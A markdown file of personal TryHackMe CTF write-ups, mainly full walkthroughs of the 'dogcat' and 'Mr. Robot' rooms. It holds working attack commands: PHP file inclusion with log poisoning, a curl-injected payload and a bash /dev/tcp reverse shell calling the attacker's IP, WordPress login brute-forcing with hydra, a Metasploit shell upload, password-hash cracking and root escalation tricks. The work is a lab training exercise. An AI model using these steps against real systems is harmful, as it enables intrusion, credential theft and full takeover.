# TryHackMe.com

Notes from challenges I did @ <https://tryhackme.com>.

Connect to tryhackme via openvpn e.g.: ```sudo openvpn 0xfab1.ovpn```

Please note:

- Flags are not fully written to avoid copy & paste ;)
- I used an SSH-Tunnel in case you are wondering why I have "localhost" instead of an IP mentioned.

## [Advent of Cyber 2](https://tryhackme.com/room/adventofcyber2)

### [Day 16] Scripting Help! Where is Santa?

Python One-Liner to query the API :)

```python
import requests 
for number in range (1,100,2): print(f'{number} --> ' + requests.get(f'http://localhost:8080/api/{number}').text)
```

## [DogCat](https://tryhackme.com/room/dogcat)

This is a full write up of the great "dogcat" CTF @ <https://tryhackme.com/room/dogcat>.

### First look

We know there is a website hosting dog and cat pictures. Let's have a look...

#### nmap

Running nmap to search for available services and versions:

```sh
nmap -sC -sV 10.10.46.238
```

Result: two ports open SSH on 22 and HTTP on 80

```txt
Host is up (0.021s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
|_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: dogcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

#### gobuster

Let's run gobuster to check for available folders using this command:

```sh
gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.46.238:80
```

Gobuster reveals the following three folders:

```sh
/cats                 (Status: 301) [Size: 311] [--> http://10.10.46.238/cats/]
/dogs                 (Status: 301) [Size: 311] [--> http://10.10.46.238/dogs/]
/server-status        (Status: 403) [Size: 277]
```

So basically we have a folder /dog with random dog pics and a folder /cat with random cat pics.

Opening [/server-status](http://httpd.apache.org/docs/2.4/mod/mod_status.html) we get the error so probably with a .htaccess file.

```txt
Forbidden

You don't have permission to access this resource.
Apache/2.4.38 (Debian)
```

#### nikto

Running nikto confirms the apache web server and shows PHP is used.
Nothing else of interest is revealed:

```sh
nikto -h 10.10.46.238
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.46.238
+ Target Hostname:    10.10.46.238
+ Target Port:        80
+ Start Time:         2021-00-00 00:00:00 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.38 (Debian)
+ Retrieved x-powered-by header: PHP/7.4.3
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7890 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2021-00-00 00:00:00 (GMT-4) (326 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

### Visit website

So now we know machine 10.10.46.238 is running a Debian based Apache (2.4.38 ) webserver with PHP (7.4.3) serving a website with dogs and cats (probably stored under "/dogs" and "/cats").

Let's visit the page on port 80 and click on dog or cat:

- We can see a random dog or cat pic
- See url changes to ?view=dog or ?view=cat.

Let's look at the "view?" parameter in more detail:

Changing the view parameter to "something" we get this error:

```txt
Sorry, only dogs or cats are allowed.
```

Changing the view parameter to "somethingwithdog" we get this error:

```txt
Warning: include(somethingwithdog.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 24

Warning: include(): Failed opening 'somethingwithdog.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 24
```

So we know the page requires us to include dog (or cat) in the view-parameter of the request and then includes a file with whatever is in the view-parameter followed by ".php". But the file does not have to be in the same directory as the programmer had intended, maybe we can try to add a relative path to the file name.

We know the website is served using apache 2.4.38 (from opening /server-status and running nmap) so we could have a look at well known apache files e.g. the log files. Just to be safe, fell free to add as many ../ as you want :D

```html
?view=./cat/../../../../../../../../var/log/apache2/access.log
```

This fails with the same error as above. So it seems we can only view ".php" files...

#### Log Poisoning

Based on how we can manipulate the view paramenter, this page may be vulnerable to [Local File Inclusion](https://blog.sqreen.com/local-file-inclusions-explained/).

With 'php://filter/convert.base64-encode/resource=' we can convert the given resource to base64
With './cat/../index' we add they keyword cat and move back to the main web folder and choose index.php

```html
?view=php://filter/convert.base64-encode/resource=./cat/../index
```

This results in the following string which is the base64 encoded representation of the index.php:

```sh
echo "PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg==" | base64 --decode
```

The index.php looks as follows:

```html
<!DOCTYPE HTML>
<html>
<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>
<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>
    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
            $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>
</html>
```

The interesting line here is ```$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';```. We see that if we add the parameter ```?ext``` we are no longer limited to requesting php files. We can add e.g. ```&ext=.txt``` or ```&ext=.log``` to view a text or log file or simply keep the parameter empty to view any file ```&ext=```.

Now lets try looking at the apache2 access.log files again (this time with the "ext" parameter):

```html
?view=./cat/../../../../../../../../var/log/apache2/access&ext=.log
```

Success! We can see the logs (our visits). The logs basically contain the URL request including parameters and the user-agent.

If you feel lucky, you could've guessed that there is a flag.php in the main folder of the website and try view this by misusing the view? parameter as follows:

```html
?view=php://filter/convert.base64-encode/resource=./cat/../flag
```

We get the message: ```Here you go!PD9waHAKJGZsYWdfMSA9ICJUSE17VGgxc18xc19OMHRfNF9DYXRkb2d...```

Which we can decode as follows to get the first flag:

```sh
echo "PD9waHAKJGZsYWdfMSA9ICJUSE17VGgxc18xc19OMHRfNF9DYXRkb2d=" | base64 --decode
```

However, this was a lucky guess... maybe there is another way to get there...

We can try to inject PHP code to the access.log and trigger the code by visiting the page. Remember from above, there are two things we can manipulate at request time that are written to the logs, the URL request including parameters and the user-agent. Let's try running a request e.g.:

```html
?view=./cat/../../<?php echo "HI!";?>
```html

Unfortunantly this fails as e.g. all spaces are URL encoded. However, there are clear spaces visible in the user-agent. Let's try to change the user-agent string:

```sh
curl -A "<?php echo "HI!";?>" http://10.10.46.238
```

Success! The user-agent string can be used to inject PHP code. Let's use this to download a php reverse shell.

### Reverse shell

Kali comes with some reverse shells e.g. [php-reverse-shell](http://pentestmonkey.net/tools/php-reverse-shell) "/usr/share/webshells/php/php-reverse-shell.php".

Let's create a copy of this file and modify the two input fields marked with "// CHANGE THIS". The IP address to put here belongs to our kali machine.

```config
$ip = '10.9.182.239';  // CHANGE THIS
$port = 9999;          // CHANGE THIS
```

Serve the file e.g. with python as follows:

```py
python -m http.server 9090
```

And start netcat on port 9999 in a second shell:

```sh
nc -lvnp 9999
```

Now let's run a GET request with a custom user-agent that includes PHP to get the reverse-shell

```sh
curl -A "<?php file_put_contents('shell.php',file_get_contents('http://10.9.182.239:9090/shell.php')); ?>" http://10.10.46.238
```

Alternatively we could use any other tool to send a GET request with custom user-agent string. E.g. burp-suite or write a python script like so:

```py
import requests
print (requests.get('http://10.10.46.238/?view=cat', headers={'User-Agent': '<?php file_put_contents("shell.php",file_get_contents("http://10.9.182.239:9090/shell.php")); ?>',}).text)
```

Use the previous technique to include the access log again:

```html
?view=./cat/../../../../../../../../var/log/apache2/access&ext=.log
```

You should not see our injected agent string because the injected php code is interpreted and executed and has no output. But you can see if this worked by checking the status of the python HTTP server.

We can now start the shell.php located in the the main web folder:

```html
?view=./cat/../shell
```

On the netcat terminal we should now have a command prompt :)
Running ```whoami``` we see we are user "www-data". Searching for flag2 reveals the following file:

```sh
find / -type f -iname "flag*"
var/www/html/flag.php
var/www/flag2_QMW7JvaY2LvK.txt
```

Btw, it is possible to view flag2 within the browser and without reverse shell:

```html
?view=./dog/../../../../../var/www/flag2_QMW7JvaY2LvK&ext=.txt
```

### Privilege escalation

Now that we have a shell as user "www-data" let's see what this user is allowed to do:

```sh
sudo -l
```

We can [exploit the env privilege](https://gtfobins.github.io/) with this command to gain root access:

```sh
sudo /usr/bin/env sudo -i
```

Running ```whoami``` we can see that we are root.

Now, let's again look for a flag:

```sh
find / -type f -iname "flag*"
/root/flag3.txt
```

### Escape the container

The last challenge is to find flag 4 which is nowhere to be found on the current system. We need to search for interesting things on the system...

List IP addresses connected to your server on port 80

```sh
netstat -tn 2>/dev/null | grep :80 | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -nr | head
```

In the root folder we can find a ".dockerenv" file.
The hostname looks like a default docker container name.
See if proc/self/cgroup contains "docker" or "lxc": ```grep 'docker\|lxc' /proc/1/cgroup```.

or run this script:

```sh
echo IsContainer: ; if [[ -f /.dockerenv ]] || grep -Eq '(lxc|docker)' /proc/1/cgroup; then echo True; else echo False; fi
```

So we know we are running in a container.

Let us look around and find other interesting files e.g. search for largest files:

```sh
lsof / | awk '{ if($7 > 1048576) print $7/1048576 "MB" " " $9 " " $1 }' | sort -n -u | tail
```

or search for newest files

```sh
find / -type d \( -name sys -o -name proc \) -prune -o -name "*"  -mtime -0.02 -print
```

We find that "backup.tar" was last udpated and it is updated every minute!
It seems as if the backup is created using the shell script in the same folder.

This looks promising: We are root in a container that hosts the dogcat website and there is a script triggered from outside of the container running the "backup.sh" script (that we are able to edit) every minute.

Let's try to exploit the backup.sh with a bash reverse shell:

First, start a new netcat session on your system:

```sh
nc -lvnp 7777
```

Then append the bash reverse shell to the backup script:

```sh
echo "bash -i >& /dev/tcp/10.9.182.239/7777 0>&1" >> backup.sh
```

After waiting at most 59 secounds the backup job will trigger, run our modified script and we get another shell from the container host system.

Running ```whoami``` we can see that we are root - whoop whoop!

Let's search for flag 4:

```sh
find / -type f -iname "flag*"
container/flag4.txt
```

## [Mr. Robot](https://tryhackme.com/room/mrrobot)

This is a full write up of the "Mr. Robot" CTF @ <https://tryhackme.com/room/mrrobot>.

### Flag 1

Let's have a look at the environment:

```sh
IP="10.10.236.216"
echo $IP
nmap -sC -sV $IP
nikto -h $IP
```

Since there is a php based website served on port 80 and 443 via apache let us have a look at the available folders:

```sh
gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://$IP:80
```

We can see a lot of folders and that there is a wordpress login page.

Further things we can check:

- View html/css/js source -> nothing special
- View links on page -> text, videos, nothing special (but cool theme)
- View robots.txt -> first flag :)

In the robots.txt we find the first key ($IP/key-1-of-3.txt) and a dictionary file (probably for wordpress login @ /login).

### Flag 2

Let's download the dictionary file "fsocity.dic" and have a look:

```sh
wget $IP/fsocity.dic
```

The file seems to be a password list but there are a lot of redunant entries. If we want to use this to brute-force login to the word-press admin portal we should remove all duplicate entries. We can use ```uniq``` for this but uniq expects a sorted list so we run the following:

```sh
sort fsocity.dic | uniq > uniqfsocity.dic
```

We can use hydra to brute-force http-post-form on the wordpress login page to find out the username. In case we get a "Invalid" the attempt failed.

```sh
hydra -L uniqfsocity.dic -p something $IP http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid"
```

We find out the username "Elliot" is valid and abort hydra. Now let's use the same dictionary again to brute-force the password of Elliot. If a correct user logs in with an invalid password we can use "incorrect" as false trigger.

```sh
hydra -l Elliot -P uniqfsocity.dic -t 64 $IP http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=incorrect."
```

This unfortunantly takes some time but after a while we get the correct password for Elliot: ER28-0652

With access to the wordpress backend we can start Metasploit to exploit wordpress for a reverse shell:

```sh
msfdb init
msfconsole
db_nmap -sV 10.10.236.216
search wp
use exploit/unix/webapp/wp_admin_shell_upload
show options
set PASSWORD ER28-0652
set USERNAME Elliot
set RHOST 10.10.236.216
set LHOST 10.9.193.173
set LPORT 6666
show options
exploit
```

Unfortunantly I get an error running this saying wordpress is not available.
After seaching the web I find out possibly we can just ignore those errors in the used script. So lets open the script and comment out what stops the script and see what happens:

```sh
locate wp_admin_shell_upload  
sudo nano /usr/share/metasploit-framework/modules/exploits/unix/webapp/wp_admin_shell_upload.rb # comment out def exploit -> #fail_with
```

and run the exploit once more:

```sh
reload
exploit
```

I now get a new error so i just comment out all "fail_with" after "def exploit" and re-run the exploit once more:

```sh
reload
show options
exploit
```

Finally the exploit works and we have a reverse shell :)
Now let's look around:

```sh
meterpreter > ls
Listing: /home/robot
====================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100400/r--------  33    fil   2015-11-13 02:28:21 -0500  key-2-of-3.txt
100644/rw-r--r--  39    fil   2015-11-13 02:28:21 -0500  password.raw-md5
```

We see key 2 "key-2-of-3.txt" but can't access it. However, we can access "password.raw-md5":

```sh
cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

This looks like the hashed password of user "robot". Let's find out what hash type is used by running ```hash-identifier```.

```sh
hash-identifier c3fcd3d76192e4007dfb496cca67e13b

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
```

Let's crack the MD5 hash with ```hashcat``` using the rockyou password list.

```sh
hashcat -m0 --force c3fcd3d76192e4007dfb496cca67e13b /home/0xfab1/rockyou.txt

Host memory required for this attack: 65 MB

Dictionary cache built:
* Filename..: /home/0xfab1/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 3 secs

c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz

Session..........: hashcat
Status...........: Cracked
Hash.Name........: MD5
Hash.Target......: c3fcd3d76192e4007dfb496cca67e13b
Guess.Base.......: File (/home/0xfab1/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   313.5 kH/s (0.32ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests
Progress.........: 40960/14344384 (0.29%)
Rejected.........: 0/40960 (0.00%)
Restore.Point....: 36864/14344384 (0.26%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: hockey5 -> loser69
```

The password for robot is abcdefghijklmnopqrstuvwxyz.
So back to the reverse shell and lets login as user "robot":

```sh
meterpreter > shell
Process 2226 created.
Channel 4 created.
python -c 'import pty; pty.spawn("/bin/bash")'
daemon@linux:/home/robot$ su -l robot
su -l robot
Password: abcdefghijklmnopqrstuvwxyz
cat /home/robot/key-2-of-3.txt
```

We now have access to "key-2-of-3.txt".

### Flag 3

Now as robot let us have a look at what we are allowed to do:

```sh
find / -user root -perm -4000 2>/dev/null

/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
```

We can exploit nmap (/usr/local/bin/nmap) with a vulnerability in the interactive mode since nmap is running with root priviledges but we can trigger it as user robot:

```sh
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
cd /root
ls
firstboot_done  key-3-of-3.txt
cat key-3-of-3.txt
```

And there we have flag 3.
